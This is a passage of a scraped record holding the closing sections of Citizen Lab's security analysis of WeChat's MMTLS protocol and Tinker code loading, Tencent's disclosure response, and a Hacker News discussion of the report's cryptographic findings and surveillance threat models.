mars-wechat, which is not open source. The Mars developers also have no plans to add support of TLS, and expect other developers using Mars to implement their own encryption in the upper layers. To make matters worse, implementing TLS within Mars seems to require a fair bit of architectural changes. Even though it would not be unfair for Tencent to keep MMTLS proprietary, MMTLS is still the main encryption system that Mars was designed for, leaving MMTLS proprietary would mean other developers using Mars would have to either devote significant resources to integrate a different encryption system with Mars, or leave everything unencrypted. Mars is also lacking in documentation. The official wiki only contains a few, old articles on how to integrate with Mars. Developers using Mars often resort to asking questions on GitHub. The lack of documentation means that developers are more prone to making mistakes, and ultimately reducing security. Further research is needed in this area to analyze the security of apps that use Tencent’s Mars library. “Tinker”, a dynamic code-loading module In this section, we tentatively refer to the APK downloaded from the Google Play Store as “WeChat APK”, and the APK downloaded from WeChat’s official website as “Weixin APK”. The distinction between WeChat and Weixin seems blurry. The WeChat APK and Weixin APK contain partially different code, as we will later discuss in this section. However, when installing both of these APKs to an English-locale Android Emulator, they both show their app names as “WeChat”. Their application ID, which is used by the Android system and Google Play Store to identify apps, are also both “com.tencent.mm”. We were also able to login to our US-number accounts using both APKs. Unlike the WeChat APK, we found that the Weixin APK contains Tinker, “a hot-fix solution library”. Tinker allows the developer to update the app itself without calling Android’s system APK installer by using a technique called “dynamic code loading”. In an earlier report we found a similar distinction between TikTok and Douyin, where we found Douyin to have a similar dynamic code-loading feature that was not present in TikTok. This feature raises three concerns: If the process for downloading and loading the dynamic code does not sufficiently authenticate the downloaded code (e.g., that it is cryptographically signed with the correct public key, that it is not out of date, and that it is the code intended to be downloaded and not other cryptographically signed and up-to-date code), an attacker might be able to exploit this process to run malicious code on the device (e.g., by injecting arbitrary code, by performing a downgrade attack, or by performing a sidegrade attack). Back in 2016, we found such instances in other Chinese apps. Even if the code downloading and loading mechanism contains no weaknesses, the dynamic code loading feature still allows the application to load code without notifying the user, bypassing users’ consent to decide what program could run on their device. For example, the developer may push out an unwanted update, and the users do not have a choice to keep using the old version. Furthermore, a developer may selectively target a user with an update that compromises their security or privacy. In 2016, a Chinese security analyst accused Alibaba of pushing dynamically loaded code to Alipay to surreptitiously take photos and record audio on his device. Dynamically loading code deprives app store reviewers from reviewing all relevant behavior of an app’s execution. As such, the Google Play Developer Program Policy does not permit apps to use dynamic code loading. When analyzing the WeChat APK, we found that, while it retains some components of Tinker. The component which seems to handle the downloading of app updates is present, however the core part of Tinker that handles loading and executing the downloaded app updates has been replaced with “no-op” functions, which perform no actions. We did not analyze the WeChat binaries available from other third party app stores. Further research is needed to analyze the security of Tinker’s app update process, whether WeChat APKs from other sources contain the dynamic code loading feature, as well as any further differences between the WeChat APK and Weixin APK. Recommendations In this section, we make recommendations based on our findings to relevant audiences. To application developers Implementing proprietary encryption is more expensive, less performant, and less secure than using well-scrutinized standard encryption suites. Given the sensitive nature of data that can be sent by applications, we encourage application developers to use tried-and-true encryption suites and protocols and to avoid rolling their own crypto. SSL/TLS has seen almost three decades of various improvements as a result of rigorous public and academic scrutiny. TLS configuration is now easier than ever before, and the advent of QUIC-based TLS has dramatically improved performance. To Tencent and WeChat developers Below is a copy of the recommendations we sent to WeChat and Tencent in our disclosure. The full disclosure correspondence can be found in the Appendix. In this post from 2016, WeChat developers note that they wished to upgrade their encryption, but the addition of another round-trip for the TLS 1.2 handshake would significantly degrade WeChat network performance, as the application relies on many short bursts of communication. At that time, TLS 1.3 was not yet an RFC (though session resumption extensions were available for TLS 1.2), so they opted to “roll their own” and incorporate TLS 1.3’s session resumption model into MMTLS. This issue of performing an extra round-trip for a handshake has been a perennial issue for application developers around the world. The TCP and TLS handshake each require a single round-trip, meaning each new data packet sent requires two round-trips. Today, TLS-over-QUIC combines the transport-layer and encryption-layer handshakes, requiring only a single handshake. QUIC was developed for this express purpose, and can provide both strong, forward-secret encryption, while halving the number of round-trips needed for secure communication. We also note that WeChat seems to already use QUIC for some large file downloads. Our recommendation would be for WeChat to migrate entirely to a standard TLS or QUIC+TLS implementation. There is also the issue of client-side performance, in addition to network performance. Since WeChat’s encryption scheme performs two layers of encryption per request, the client is performing double the work to encrypt data than if WeChat used a single standardized cryptosystem. To operating systems On the web, client-side browser security warnings and the use of HTTPS as a ranking factor in search engines contributed to widespread TLS adoption. We can draw loose analogies to the mobile ecosystem’s operating systems and application stores. Is there any platform or OS-level permission model that can indicate regular usage of standard encrypted network communications? As we mentioned in our prior work studying proprietary cryptography in Chinese IME keyboards, OS developers could consider device permission models that surface whether applications use lower-level system calls for network access. To high-risk users with privacy concerns Many WeChat users use it out of necessity rather than choice. For users with privacy concerns who are using WeChat out of necessity, our recommendations from the previous report still hold: Avoid features delineated as “Weixin” services if possible. We note that many core “Weixin” services (such as Search, Channels, Mini Programs) as delineated by the Privacy Policy perform more tracking than core “WeChat” services. When possible, prefer web or applications over Mini Programs or other such embedded functionality. Use stricter device permissions and update your software and OS regularly for security features. In addition, due to the risks introduced by dynamic code loading in WeChat downloaded from the official website, we recommend users to instead download WeChat from the Google Play Store whenever possible. For users who have already installed WeChat from the official website, removing and re-installing the Google Play Store version would also mitigate the risk. To security and privacy researchers As WeChat has over one billion users, we posit that the order of magnitude of global MMTLS users is on a similar order of magnitude as global TLS users. Despite this, there is little-to-no third-party analysis or scrutiny of MMTLS, as there is in TLS. At this scale of influence, MMTLS deserves similar scrutiny as TLS. We implore future security and privacy researchers to build on this work to continue the study of the MMTLS protocol, as from our correspondences, Tencent insists on continuing to use and develop MMTLS for WeChat connections. Acknowledgments We would like to thank Jedidiah Crandall, Jakub Dalek, Prateek Mittal, and Jonathan Mayer for their guidance and feedback on this report. Research for this project was supervised by Ron Deibert. Appendix In this appendix, we detail our disclosure to Tencent concerning our findings and their response. April 24, 2024 — Our disclosure To Whom It May Concern: The Citizen Lab is an academic research group based at the Munk School of Global Affairs & Public Policy at the University of Toronto in Toronto, Canada. We analyzed WeChat v8.0.23 on Android and iOS as part of our ongoing work analyzing popular mobile and desktop apps for security and privacy issues. We found that WeChat’s proprietary network encryption protocol, MMTLS, contains weaknesses compared to modern network encryption protocols, such as TLS or QUIC+TLS. For instance, the protocol is not forward-secret and may be susceptible to replay attacks. We plan on publishing a documentation of the MMTLS network encryption protocol and strongly suggest that WeChat, which is responsible for the network security of over 1 billion users, switch to a strong and performant encryption protocol like TLS or QUIC+TLS. For further details, please see the attached document. Timeline to Public Disclosure The Citizen Lab is committed to research transparency and will publish details regarding the security vulnerabilities it discovers in the context of its research activities, absent exceptional circumstances, on its website: https://citizenlab.ca/. The Citizen Lab will publish the details of our analysis no sooner than 45 calendar days from the date of this communication. Should you have any questions about our findings please let us know. We can be reached at this email address: disclosure@citlab.utoronto.ca. Sincerely, The Citizen Lab May 17, 2024 — Tencent’s response Thank you for your report.Since receiving your report on April 25th, 2024, we have conducted a careful evaluation.The core of WeChat’s security protocol is outer layer mmtls encryption, currently ensuring that outer layer mmtls encryption is secure. On the other hand, the encryption issues in the inner layer are handled as follows: the core data traffic has been switched to AES-GCM encryption, while other traffic is gradually switching from AES-CBC to AES-GCM.If you have any other questions, please let us know.thanks. The terms “shortlink” and “longlink” do not seem to be specific to WeChat, since it was also mentioned in other technical blogs.↩︎ On Android, the main process is named after the app ID, “com.tencent.mm”. (The process name can be seen using the ps command in adb shell.) When an app starts a new process, it assigns a name. The assigned name will be added to the app ID to form the full name of the new process. So the “:push” process’s full name is “com.tencent.mm:push”.↩︎ This server heartbeat is a reply to a prior client-sent heartbeat.↩︎",
    "commentLink": "https://news.ycombinator.com/item?id=41863278",
    "commentBody": "Should We Chat, Too? Security Analysis of WeChat's Mmtls Encryption Protocol (citizenlab.ca)150 points by lladnar 22 hours agohidepastfavorite83 comments dtquad 22 hours agoThe Chinese government has direct access to the WeChat backend so it's unlikely that these weaknesses were government mandated. Probably just the result of overworked 996 developers: >The name 996.ICU refers to \"Work by '996', sick in ICU\", an ironic saying among Chinese developers, which means that by following the \"996\" work schedule, you are risking yourself getting into the ICU (Intensive Care Unit) https://github.com/996icu/996.ICU reply lloyds_barclays 9 hours agoparentJust my personal experience. One of my family members who lived in China was involved in a Ponzi fraud couple years ago. They told me that when they entered the interrogation room, officers had already printed out their WeChat chatting history, even before they handed out their phone. reply okasaki 7 hours agorootparentWell there's (at least) two people involved in a chat. They could have just gotten it from the other person. reply giancarlostoro 4 hours agorootparentI read it as their entire chat history. reply firen777 15 hours agoparentprev> The Chinese government has direct access to the WeChat backend Oh dear, I need to rant about this. Everyone and their grandma know in their guts that the ccp keep every single thing you ever send. So why on earth do wechat not back up your convo (a bog standard feature that is available to even e2ee messengers) when you need to switch to a new phone? Yes, I know you can transfer data locally (with unintuitive process since wechat does not support simultaneous login on multiple devices) but what happens if your old phone outright died? I already relinquish all my privacy to the overlord so can they at least give us back some usability instead of this archaic pos? Just need to vent my recent painful experience. reply giancarlostoro 4 hours agorootparent...why do you use it if there's a million superior services that do not do that and transfer your history correctly? reply mrWiz 3 hours agorootparentI'm going to guess that at least some of the people firen777 wants to message don't use those services. reply chvid 12 hours agoparentprevYes. The Chinese government likely have \"front door\" access rather than having to rely on capturing network traffic and exploit some hidden weakness in a protocol. But why are Chinese companies making their own security protocol / libraries rather adopting \"cryptographic best practices\"? Do they actually think that common crypto libraries are flawed? Or is this a part of China's deep tech / self-sufficient efforts? reply ganyu 5 hours agorootparentMost of those devs back in 2011 were rookies, and many still are now. It would've been lucky enough for them to have even heard of the word 'asymmetric encryption'. And you can still find many public APIs in the WeChat docs (in 2022) that uses hand-written AES stuff that, unfortunately, uses ECB. Back in those days where the CN internet infrastructure as we see today was laid down, devs and PMs literally didn't know for sure what were they doing, but they still worked overnight because it the new features must be shipped before next weekend. And since the services worked pretty well until today it's kinda better to keep the s__tpile there and don't change it. Also there's a lot of unmaintained 'PWA's in the wild that relies on legacy APIs that you dare not to break. reply chvid 4 hours agorootparentSo they are just stupid, overworked and stuck with their own spaghetti? reply randomNumber7 10 hours agorootparentprevProbably they think more control is still better. reply CorrectHorseBat 5 hours agoparentprevI've heard even banks can get access to your WeChat history reply nhggfu 6 hours agoparentprevmeanwhile, the US gov + their buddies have access to global skype chats. reply talldayo 4 hours agorootparentAmerica ensures access to a whole lot more than just Skype: https://www.malwarebytes.com/blog/news/2021/12/heres-what-da... reply notpushkin 15 hours agoparentprevMost likely, yeah. This also reminds me of the issues with KakaoTalk: https://stulle123.github.io/posts/kakaotalk/secret-chat/ https://stulle123.github.io/posts/kakaotalk-account-takeover..., https://news.ycombinator.com/item?id=40776880 Wondering if Line is next up! reply daghamm 21 hours agoparentprevWeChat is basically one of the tools the communist party uses to control the population. If something is on there it is most likely by design. Off topic (or is it?): While back a western journalist in China reported that her wechat account was banned 10 minutes after changing her password to \"fuckCCP\"... reply tptacek 21 hours agorootparentThe point being made in the preceding comment is that the threat model for WeChat already overtly includes its operators being able to puncture its confidentiality. It doesn't make a lot of operational sense to introduce complicated cryptographic backdoors (such as the IV construction, which the authors say could potentially introduce an AES-GCM key/IV brute forcing attack) when you control the keys for all the connections in the first place. reply throwaway48476 20 hours agorootparentNot only control keys, but control the software update mechanism (backdoor a la xz). reply randomNumber7 10 hours agorootparentprevAnd the argument is pretty weak. It doesnt cost them much to introduce cryptographic backdoors. Once they have done this they have even more control. It is then also less effort, because you don't have to deal with a company (like WeChat) directly to spy on their customers. reply tptacek 1 hour agorootparentLook at the weaknesses in this blog post; can you tell me which ones are suggestive of a broadly-useful backdoor that would be deployed to avoid having to deal directly with Tencent, which is already controlled by the CCP? reply homebrewer 20 hours agorootparentprevI had my account banned for absolutely no reason (I didn't even use it to talk to anyone and was simply learning the interface myself to explain it later to a friend who was traveling to China). You can't infer anything from that story. Their \"security\" automation is even more paranoid than Google's, that's probably all there's to it. reply olalonde 18 hours agorootparentprevThe issue of accounts being banned after a password change is quite common, especially outside of China. This isn't related to the content of the new password. Additionally, it's unlikely that the protocol has government-mandated vulnerabilities, as such weaknesses could potentially allow foreign governments to spy on WeChat users that are abroad. The Chinese government doesn't need such weaknesses, as they have access to the servers. reply Spooky23 7 hours agorootparent“The government” isn’t a single entity. Agents within the bureaucracy have to within rules and policies. And the front door access methods have things like audit trails to prevent internal abuse. There are many scenarios where the existence of an official investigation as evidenced by said audit logs is undesirable for a variety of reasons. reply mschuster91 5 hours agorootparent> Agents within the bureaucracy have to within rules and policies. And the front door access methods have things like audit trails to prevent internal abuse. In Western countries, yes - but even there, abuse and evasion of audit trails is quite common. The most infamous scandal here in Germany was around a cop station that more than not resembled a pig sty when it comes to procedures [1] - after the address of a lawyer representing the victims of the far-right NSU terror crew got leaked to another far-right terror cell, the audit trail led to a precinct in Frankfurt but went cold there as supposedly, the cops there all used a shared account of one of them. IMHO, every single one of these cops should have faced a year or two in jail for that stunt. [1] https://taz.de/Ermittlungen-zu-NSU-20-eingestellt/!5989941/ reply mmooss 17 hours agorootparentprev> If something is on there it is most likely by design. It's a common mistake to overestimate the 'bad guy'. The Chinese government, like all other large human institutions, certainly does plenty of dumb stuff. reply shiroiushi 11 hours agorootparentHanlon's Razor: never ascribe to malice that which can be adequately explained by incompetence or stupidity. reply lucw 15 hours agorootparentprevThe server-side store a full plain text archive with government access is by design. the weak encryption is NOT by design. It's due to incompetent programmers. reply upofadown 21 hours agoprev>Generally, NIST recommends[1] not using a wholly deterministic derivation for IVs in AES-GCM since it is easy to accidentally re-use IVs. A quick skim of the referenced document did not show where NIST recommended against the use of deterministic IVs. The document actually spends a significant amount of text in discussing how one would do such a thing. Did I miss something? >Lack of forward secrecy The article mentions that the key is forgotten when you close the app. Probably enough forward secrecy for most people. >Since AES-CBC is used alongside PKCS7 padding, it is possible that the use of this encryption on its own would be susceptible to an AES-CBC padding oracle, which can lead to recovery of the encrypted plaintext. This is a messaging app. Is there actually an available oracle? Does the implementation even generate a padding error? [1] https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpubli... reply tptacek 19 hours agoparentThe GCM IV thing didn't ring true to me either; in fact, the whole reason we have XAES-type constructions is to enable fully nondeterministic IVs, which don't fit comfortably in the GCM IV space. Regarding padding oracles: it is most definitely not necessary for a target to generate a \"padding error\", or even an explicit error of any sort, to enable the attack. reply upofadown 18 hours agorootparentThere has to be some reverse channel to do an oracle. Timing? That might not be a thing for messaging. Signal apparently also uses CBC with the same type of padding. So the same shade could be thrown in that direction if someone really wanted to do so. I would be happier if there were fewer vague assertions in these sorts of writeups... reply tptacek 18 hours agorootparentI'm not sure what part of Signal you're referring to, but the Signal Protocol generally uses AEAD constructions. That aside: the kind of padding is not the issue; every serious system that uses CBC uses PKCS7 padding. The issue is the lack of authenticated ciphertext, which is what enables the attack. The authenticated scheme composing CBC and HMAC in an EtM arrangement is not susceptible to padding oracle attacks. There are other error and behavior oracles for other padding schemes, and for different block cipher modes. reply mozman 17 hours agorootparentprev> nondeterministic IVs Can you explain what this means? reply tptacek 17 hours agorootparentIn this case it's just a fancy way of saying \"random\". What's important about a GCM nonce is that it never repeat, not that it's unpredictable (to me, a distinction between a \"nonce\" and an \"IV\"; a CBC IV must be unpredictable). Because you only get 96 bits of nonce space with vanilla GCM, there's common advice to use a counter as the nonce. reply est 17 hours agoprevChinese apps don't need encryption but pretends to, the government had direct access to all clear-text data. If you can't comply your business would be fucked one way or another. Security researchers need to stop beating the dead horse. The encryption mechanism is mostly used for compliance or certification. In fact many corp-intranet middleboxes can decrypt wechat communications, it's not a bug, it's a feature. IRL people just treat wechat as somekind of Discord with payment options. If you say something slightly wrong your account would instantly get into trouble. Just assume your wechat chat records are public one way or another. reply CGamesPlay 17 hours agoparentJust to be clear, encryption to hide from broad government surveillance is one valid use for encryption (which WeChat doesn't have), but it is far from the only reason for encrypted communications. Common theives, abusive exes, or overbearing employers are a few others that immediately come to mind. reply est 17 hours agorootparent> Common theives, abusive exes, or overbearing employers as I commented on other thread, they don't even bother with network protocols. They just mandate install spyware on your end devices. So E2EE won't help here. Chinese Android ROMs are notorious for this. Even the phone manufacturers are collecting data reply crazylogger 14 hours agoparentprevFor one thing, Chinese government does have an incentive to enforce good encryption so that foreign adversaries cannot snoop in on important Chinese communications. Only the Chinese government has access via Tencent’s backend. reply Yeul 10 hours agorootparentThe Dutch government is a joke they'll happily communicate via WhatsApp. But then the Netherlands is hardly a geopolitical player. But surely Chinese officials don't use Wechat? reply some_random 4 hours agorootparentFirst off the Dutch are pretty important for a few reasons, their ports and cyber program being the first things that pop into my head. As for Wechat, why wouldn't Chinese officials use it? Even if they didn't use it for official work (which they do, to the best of my knowledge), just about everyone there uses it. reply Beretta_Vexee 3 hours agoparentprevCryptography has one function: to protect Chinese users from malicious Chinese ISPs. As for DNS over HTTPS, which they use in the majority of their apps to avoid hijacking by traffickers, ads, etc., the cryptography has one function: to protect Chinese users from bad Chinese ISPs and their lying DNS. reply imiric 20 hours agoprevThese findings are so unsurprising that the research is borderline boring. What I would like to see are similar efforts directed at the tower of complexity that is the modern TLS stack. From the Snowden leaks we know that the NSA has tried to break cryptographic algorithms for decades via their project Bullrun, and that they bribed the RSA to default to their compromised algorithm. From the recent XZ incident we also know that supply chain attacks can be very sophisticated and difficult to detect. How likely is it that the protocols we consider secure today are silently compromised by an undetected agent? Should we just assume that they are, like a sibling comment suggested? I'm frankly more interested in knowing if there is oversight of these complex technologies that could possibly alert us of any anomalies of this type, so that we don't have to rely on whistleblowers or people who happen to notice strange behavior and decide to look into it out of curiosity. Too much is at stake for this to be left up to chance. reply toast0 1 hour agoparentMost of the things people get dinged for in this kind of report are things that were already fixed in modern TLS. If you set your clients and servers to TLS 1.3 only (which I consider the modern TLS stack), you only have a handful of ciphers to choose from (AES128-GCM, AES256-GCM, and ChaCha20-Poly1305), which avoids any issues with CBC constructions. Most of your issues are going to be around x.509 certificate processing, because TLS protocol and ciphers are easier to use correctly than in the past, but x.509 hasn't changed significantly. reply lazide 3 hours agoparentprevOversight, yes mostly. The issue is that the stack is very complex, and who watches/pays the watchers? reply thimabi 21 hours agoprevWeChat using a custom protocol like MMTLS instead of sticking with something solid like TLS 1.3 is a risky move. Rolling your own crypto almost always leads to trouble. Of course, there may be ulterior motives behind Tencent’s decision, and users have little power to change it. For an app with over a billion users, that’s pretty concerning. reply toast0 1 hour agoparentThe article says WeChat published a document in 2016 regarding MMTLS vs TLS 1.3. The finalized RFC for TLS 1.3 is from August 2018. There were a fair number of changes in the later drafts of TLS 1.3, and little support for it in 2016, so it wasn't a solid choice they could stick to when they needed it. The comments on MMTLS don't seem that terrible. Is it really a problem to generate an IV once per connection and then increment it? My understanding (which could be wrong) is that's pretty much how people use AES-GCM? Maybe there's a concern about how they generate the IV, but that isn't stated or was lost in translation. The comment about forward security on shortlink is that that's all in early data, so the PSK is problematic. It'd be early data with a PSK for TLS 1.3 too; eliminating a round trip for crypto establishment is a clear goal to reduce latency in message submission. The comment about longlink connections being long feels like it'd be a problem in TLS 1.3 as well. From what I can tell, this report is lacking details (which may be in the original chinese report), but MMTLS looks like WeChat checked out the drafts of TLS 1.3 and did something roughly equivalent, and then tunnels it through whatever connectivity they have. Could they have come back after TLS 1.3 exited draft and redo it with a standard? sure; does it gain much? probably not. Switching to QUIC (or TCP fast open) may enable a single round trip for connectivity and crypto establishment, but there needs to be a fallback to regular TCP, because not all clients have UDP connectivity. Then there's issues with the 'business layer' encryption, but that's not MMTLS. reply tptacek 19 hours agoparentprevIs it concerning? It's not end-to-end secure to begin with. reply thimabi 19 hours agorootparentIt is insecure depending on one’s threat model. Though I agree end-to-end encryption would be the best practice. reply est 17 hours agorootparent> end-to-end encryption would be the best practice If you think about it, no it's not in this case. The \"end\" you are refering to here, are mostly Chinese android phones. The system just hook into your apk, read your (encrypted) sqlite3 local data, or screen-read your UI for content. Even the Wechat realized how badly the landscape was, so they even rolled rolled out inhouse \"input method\" for \"privacy conerns\" reply tptacek 19 hours agorootparentprevCan you articulate what that threat model would be? reply xvector 18 hours agorootparentYou are only okay with the CCP and your recipient knowing your conversation. reply tptacek 18 hours agorootparentThat's kind of how I read it too, which makes some of the suppositions here (about the CCP inducing bad protocol design) odd. reply im3w1l 9 hours agorootparentI agree it's probably a mistake but I can also see another possibility: But first, consider the CCP. The CCP has nearly 100 million members. That's a lot of people. More than many countries. It's not a very exclusive club. Clearly such a large organization cannot be considered as a united whole. It's not just whether \"the CCP can read it\" it's about which part of the CCP can read it. Can the low ranking CCP member read the wechat message of the high ranking member fucking his wife? Maybe not? But maybe he would like to? Maybe he knows a mathematician that can help him for a reasonable sum of money? Or maybe someone wants to do a bit of corporate espionage? In other words the inner core of the party wants nobus, whereas the periphery has incentives to undermine it. reply mouse_ 22 hours agoprevShow me the outcome and I'll show you the incentive. Hint: backdoors I wouldn't trust any federally approved encryption. From any country. I wouldn't trust them, but I WOULD use them, given no other choice to reach the users I'm after. But always assume zero trust. With any computer thing, zero trust. Computer systems and those who orchestrate them are sneaky little devils. reply creatonez 22 hours agoparentAnd even if it isn't screwed up by active malice... don't be surprised if it's screwed up by pure incompetence. South Korea's internet is still plagued by government-approved encryption standards, which, due to the deprecation of ActiveX, sometimes require installing institution-specific cryptography software to tunnel connections through a local HTTP server so it can be encrypted outside of the web browser - https://palant.info/2023/01/02/south-koreas-online-security-... reply palata 21 hours agoparentprev> I wouldn't trust them, but I WOULD use them, given no other choice to reach the users I'm after. Which is no different from trusting them. The reality is that you have to trust something at some point. reply sodality2 19 hours agorootparentNot true, you can use something in an untrusting manner. Like assuming everything you send on the platform to be known to the government. Anyone in the USA who uses SMS should be operating like that, for example. reply palata 4 hours agorootparentHmm... if you assume that your government can read your messages but still use the service, then you trust your government to not hurt you based on that. So there is trust. If, however, you don't send messages you would like to send because you don't trust the service, then it is true that you are not trusting the service, but you are not using it (for those sensitive messages) either. As soon as you actually use something that matters, you have to trust it. Sending sensitive messages over a system that you don't trust while admitting you don't trust it is... weird. reply lazide 3 hours agorootparentIs sending everything encrypted trusting, or not trusting, the communication channel. reply kccqzy 22 hours agoprevI personally am not very interested in this research. WeChat is well known not to use end-to-end encryption. Considering that the app is unlikely to adopt end-to-end encryption (likely due to censorship being a business requirement, which was mentioned in the article and previously uncovered by this lab), I don't really feel like I care a whole lot between good non-end-to-end encryption and bad non-end-to-end encryption. Parties that are interested in subverting this kind of encryption, such as governments, likely already collaborate Tencent to get decrypted messages from the source. reply palata 22 hours agoparent> I don't really feel like I care a whole lot between good non-end-to-end encryption and bad non-end-to-end encryption. That's the difference between \"you have to trust WeChat\" and \"anyone can read your chats\". Of course you may not personally be interested because you don't personally use WeChat, but for the billion active users who do, I think it should matter. reply kccqzy 22 hours agorootparentWhere did you see that \"anyone can read your chats\" in this article? Indeed near the beginning of the article in the fourth bullet point the author states \"we were unable to develop an attack to completely defeat WeChat’s encryption\" right there. The only parties who are interested in expending more effort to break this kind of encryption are just governments, who can simply force Tencent to give up plaintext records. reply datadeft 21 hours agorootparentYep. Btw the threat model for me is this: - against random 3rd party, even WeChat is ok - against random black hats, most of chat software is ok, maybe even WeChat - against gov agencies, nothing is going to protect you When I am in China, i happily use WeChat including the gazillion of services available through it. Buying metro pass, ordering food, getting a battery pack and so on. Btw no country could replicate this outside of China, which is an interesting phenomenon. We have endless ads including actual scams and malware distributed by Google Ads yet I cannot buy train tickets in the EU through a single app and order food as well, let alone getting a cab. It would be great though. reply xvilka 11 hours agorootparentGrab in SEA region could be said as one more example of such a \"super app\" too. reply kadoban 21 hours agorootparentprev> I don't really feel like I care a whole lot between good non-end-to-end encryption and bad non-end-to-end encryption Bad non-end-to-end encryption is exactly that: \"anyone can read your chats\". That's not what the research found, it's just the implication of your original statement. reply est 17 hours agorootparentPlease realize, in China, you can't trust your \"end\" either. It's always infested with spyware with local root access. reply kccqzy 16 hours agorootparentprevOkay I shouldn't have used the word \"bad\" here. I should have used \"flawed but not detrimental\" just like what's described in the article. reply palata 21 hours agorootparentprev> Where did you see that \"anyone can read your chats\" in this article? I didn't. I answered to what you wrote, which I quoted. But I can quote it again: > I don't really feel like I care a whole lot between good non-end-to-end encryption and bad non-end-to-end encryption. reply maxglute 21 hours agoprevnext [5 more] [flagged] throwaway48476 21 hours agoparentBy \"western encryption\" do you mean crypto systems that have been subjected to public scrutiny? reply maxglute 20 hours agorootparentSystems whose scrutiny/reputation is more subject to western \"trust me bro\". Authors had courtesy to recognize TLS drama in 2010s, and assumes it's... better/sufficient now because why, a bunch of US companies, many with teams of ex US intelligence on internal security teams is doing bulk of the scrutinizing. PRC seems to like their home-grown cryptography gated behind language barrier. Maybe they're hedging on bet that enough diverse implementations better than eggs in single basket. Or the amount of Chinese fluency decreasing in west going to add another layer of security/obscurity. Ultimately who knows, other than PRC would be idiotic to listen to OTF-ICFP funded recommendations, a program that avoids \"focus\" on countries with minimal information controls, i.e. if there's a reason not to trust western scrutinized crypto systems, you likely won't find it from OTF and citizenlab. reply throwaway48476 20 hours agorootparentI don't see how the language barrier provides any security. If your threat model is foreign governments and you're rolling your own crypto you have to assume they have plenty of budget for translation. Technology is one of the main collection activities of any spy agency. Trust in a crypto system is established by having multiple adversarial parties use it and the system being open to attack for many years without success. reply maxglute 15 hours agorootparentWestern spy agencies already overwhelmed by volume of PRC cyber activity per recent headlines, meanwhile FVEY also short of Chinese specialists, and institutions not generating enough language talent. It's less budget issue as bodies issue. Multiple adversarial parties who are still likely cooperating with intelligence - MSS isn't going to get a seat at the table/behind the scenes for western crypto standards. Do we really know system hasn't been attacked without success when there's frequent PRC penetration in the news. What we do know is west/US has advtanges along the hardware/software stack, so smart for PRC to obfusgate and add complexity at points they can control. And that one of OTF's explicit mission, especially ICFP funded fellows is to undermine PRC controlled web - it would be incredibly dumb for PRC to take their advice seriously. reply ELPROFESOR 16 hours agoprevHello reply bzmrgonz 22 hours agoprevWhat do you say to observers who would see this analysis as a parallel to the huawei or Tiktok western argument, meaning, \"don't let them spy on you, let us spy on you instead!!!\" reply jeltz 20 hours agoparentIsn't this the opposite? It is warning that WeChat's security might be weak since it is using weird non-standard stuff which means everyone might be able to spy on WeChat users, not just China. If WeChat fixed this then only China would be able to spy on the users. reply two-sandwich 21 hours agoparentprevIs there something you'd like those observers to hear? reply spacebanana7 21 hours agoprev [–] I wonder whether WeChat is one of the safest messaging apps because it has the strength to say no to western agencies. Signal and Matrix can be pressured with a rubber hose if there’s enough desire. And I imagine bureaucratic equivalents exits for iMessage and WhatsApp. But the CCP can offer genuine protection to WeChat executives. reply palata 21 hours agoparent> I wonder whether WeChat is one of the safest messaging apps because it has the strength to say no to western agencies. That is not how cryptography works. If you use proper end-to-end encryption (e.g. the Signal protocol), and assuming that you use it properly, then the server does not have access to the content of the encrypted messages. So the server cannot be pressured, period. So the Signal protocol is strictly better than a protocol that is audited and found wanting (TFA talking about the WeChat protocol here). reply vbezhenar 20 hours agorootparentUntil next update will send your keys. Do you disassemble every update? I doubt it. In the end it's all about developer trust, because no popular messaging has thriving multi-client ecosystem after Jabber was abandoned. They all have \"official\" blessed client and some even fight third-party clients. Not even talking about server side, things are just grim there. reply palata 4 hours agorootparent> Until next update will send your keys. Do you disassemble every update? This is actually a big problem with all the web-based stuff where you re-download your client everytime you use it. Now for an open source mobile app, you can actually compile it from source without having to disassemble. But of course it's not practical to audit it yourself. However, if the same binary is distributed to millions of people, you only need one of them to see the exploit. If Signal updated the app to send the key, it would do it for millions of people through the Play Store. That's risky. Unless Signal convinced Google to send a specific binary to a specific user of course, but that's harder. reply hackernudes 19 hours agorootparentprevSignal does a far better job than most. They have open source clients. They sign their builds. The android build is reproducible (you can build it yourself and it will match exactly what they publish, see https://github.com/signalapp/Signal-Android/blob/main/reprod...). Presumably some people in the world do it. Now of course I personally don't check the app shipped to me from the Google Play Store, but at least I could! It's not that I disagree with your point at all. There are still many places for world powers to compel companies to spy on users (in both hardware and software). Just want to call out that Signal is doing pretty much the best they can. reply osamagirl69 21 hours agoparentprev [–] I have not been following the end-to-end encryption discussion in a while so please excuse my ignorance in asking... How does the 'rubber hose' threat apply to Matrix? So long as you are in control of your home server (or at least use a home server you trust) I am not sure who your advisary would pressure. reply jeltz 20 hours agorootparent [–] They could force them to add a backdoor in the Element build uploaded to the app store so they can use that backdoor to attack specific users. This is why we need reproducible builds and code which automatically check for discrepancies. reply osamagirl69 2 hours agorootparent [–] FWIW, the current version of element (X) is published as a reproducible build on f-droid. https://f-droid.org/en/packages/io.element.android.x/ reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The report is the first public analysis of WeChat's MMTLS encryption protocol, identifying significant security weaknesses due to custom cryptographic modifications.- Issues such as deterministic Initialization Vectors (IVs) and lack of forward secrecy are highlighted, indicating a failure to adopt cryptographic best practices in Chinese apps.- The authors recommend transitioning to standard encryption protocols like TLS or QUIC+TLS for enhanced security and provide tools and documentation for further research on WeChat's security."
    ],
    "commentSummary": [
      "The article highlights security concerns with WeChat's Mmtls encryption protocol, pointing out its weaknesses and potential vulnerabilities.",
      "It suggests that these vulnerabilities are likely due to overworked developers rather than being government-mandated, despite the Chinese government's direct access to WeChat's backend.",
      "The discussion raises broader issues about the use of non-standard encryption protocols and the challenges of maintaining secure communications amid potential government surveillance."
    ],
    "points": 150,
    "commentCount": 83,
    "retryCount": 0,
    "time": 1729109218
  },
  {
    "id": 41866742,
    "title": "OpenVMM – A New VMM for Windows and Linux, Written in Rust",
    "originLink": "https://github.com/microsoft/openvmm",
